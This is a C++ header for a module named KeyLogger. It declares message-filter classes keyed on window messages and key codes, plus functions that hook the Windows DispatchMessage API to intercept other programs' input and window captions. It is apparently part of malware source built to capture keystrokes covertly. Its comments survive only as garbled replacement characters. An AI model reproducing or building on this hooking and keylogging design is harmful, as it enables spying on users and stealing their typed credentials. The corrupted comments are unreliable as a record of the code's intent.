#pragma once

#include "core.h"

namespace KeyLogger
{

//�������������� ���������� �� ����
struct InfoWnd
{
	StringBuilderStack<256> caption;
	StringBuilderStack<256> nameClass;
	uint hashCaption;
	uint hashNameClass;
};

struct FilterMsgParams
{
	HWND hwnd;
	uint msg;
	WPARAM wparam;
	LPARAM lparam;
	bool ansi;
	POINT* pt;
	InfoWnd* infoWnd;
	bool _stop; //true ���� � ���� ������ ������������ ����� ������������, ���� ��� ������ �� ������ �������� �������, 
				//�� ��� stop = true ����� �������� ����� �������� �������, ��� ���� � _ret ������ ���� ����������� ������������ ��������
	DWORD _ret; //������������ �������� �������� �������
	bool _update; //true ���� ����� ��������� ���� ��������, ��� ����� ������������ ��� ������ �������� ������� (������ � ������ ���� ������ ������ �� �������� �������)
};

//������ �������� ���������
class FilterMsgBase
{
	public:

		FilterMsgBase();
		~FilterMsgBase();
		virtual bool Check( FilterMsgParams& params );
};

//����������� �� ��������� �������� ���������
class FilterMsg : public FilterMsgBase
{
		uint* msgs; //�� ����� ��������� �����������
		int c_msgs; //���������� ���������

	public:

		FilterMsg( const uint* _msgs, uint _c_msgs );
		~FilterMsg();
		virtual bool Check( FilterMsgParams& params );
};

//����������� �� ������� �������� ������
class FilterKey : public FilterMsg
{
		uint* keys; //�� ����� ������� ����������
		int c_keys; //���������� �������� ������

	public: 

		FilterKey( const uint* msgs, uint c_msgs, uint* _keys, int c_keys );
		~FilterKey();
		virtual bool Check( FilterMsgParams& params );
};

//����������� ���� ��� ���������� ������� ��������� (������� and)
class FilterMsgAnd : public FilterMsgBase
{
		FilterMsgBase* filters;
		int c_filters;

	public:

		FilterMsgAnd( const FilterMsgBase* _filters, int _c_filters );
		~FilterMsgAnd();
		virtual bool Check( FilterMsgParams& params );
};

//����������� ���� ���� ���� ���������� ��������� (������� or)
class FilterMsgOr : public FilterMsgBase
{
		FilterMsgBase** filters;
		int c_filters;

	public:

		FilterMsgOr( const FilterMsgBase** _filters, int _c_filters );
		~FilterMsgOr();
		virtual bool Check( FilterMsgParams& params );
};

//���������� �������� ��������� ��� ������������ ������� ���������
class ExecForFilterMsg
{
	protected:

		FilterMsgBase* filter;
		virtual void Exec( FilterMsgParams& params );

	public:

		ExecForFilterMsg( FilterMsgBase* _filter ) : filter(_filter)
		{
		}
		//��������� ��� ������������ �������
		void ExecCondition( FilterMsgParams& params );

};

//���������� ������ � ������� DispatchMessage (A, W), before = true - �� ���������� �������� �������
bool JoinDispatchMessage( ExecForFilterMsg* filter, bool before = false );
//���������� ������ � ������� DispatchMessage (A, W), ������������� ����������� ��������� InfoWnd, � JoinDispatchMessage ��� �� �����������
bool JoinDispatchMessageWnd( ExecForFilterMsg* filter, bool before = false );

}
